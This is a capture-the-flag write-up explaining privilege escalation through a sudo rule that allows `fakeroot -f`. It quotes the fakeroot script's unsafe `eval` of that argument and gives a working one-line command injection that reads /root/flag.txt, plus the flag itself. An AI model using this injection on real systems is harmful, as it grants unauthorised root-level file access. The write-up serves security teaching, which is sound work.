# Fake news

Once connected we discover that the system is in read only.

We can not create file nowhere on the disk.

We can use `sudo -l` to list sudo privileges : 

```bash
$ sudo -l
Matching Defaults entries for user on 097e9eba615d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User user may run the following commands on 097e9eba615d:
    (ALL) NOPASSWD: /usr/bin/fakeroot -f *
```

We can run fakeroot as root, and specify a "fakedbin" `-f|--faked fakedbin` 

Fakeroot is open source, and we can discover the source code on the following link : 

- [https://github.com/mackyle/fakeroot](https://github.com/mackyle/fakeroot)

By reading the source code we discover the following the file which is used to parse fakeroot arguments : 

- [https://github.com/mackyle/fakeroot/blob/787d7578282afa0bbd0adcebdb1ee64801749bad/scripts/fakeroot.in#L9](https://github.com/mackyle/fakeroot/blob/787d7578282afa0bbd0adcebdb1ee64801749bad/scripts/fakeroot.in#L9)

As the sudo rules told us, we can use `-f` argument. The source code is : 

```bash
while test "X$1" != "X--"; do
  case "$1" in
    -l|--lib)
       shift
       LIB=`eval echo "$1"`
       PATHS=
       ;;
    -f|--faked)
       shift
       FAKED="$1"
       ;;
    
    ...
    ...

if test -n "$FAKEROOTKEY"
then
    fatal "FAKEROOTKEY set to $FAKEROOTKEY" \
          "nested operation not yet supported"
fi

unset FAKEROOTKEY
KEY_PID=`eval $FAKED $FAKEDOPTS $PIPEIN`
FAKEROOTKEY=`echo $KEY_PID|cut -d: -f1`
PID=`echo $KEY_PID|cut -d: -f2`

```

The application put our value in "FAKED" variable. Few lines later this value is used in "eval" command, allowing command injection.

We can use the following exploit to get the flag: 

```bash
$ sudo fakeroot -f '$(cat /root/flag.txt)'
/usr/bin/fakeroot: 1: eval: RM{Omg_Fakeroot_is_Fak3???}: not found
fakeroot: error while starting the `faked' daemon.
/usr/bin/fakeroot: 1: kill: Usage: kill [-s sigspec | -signum | -sigspec] [pid | job]... or
kill -l [exitstatus
``` 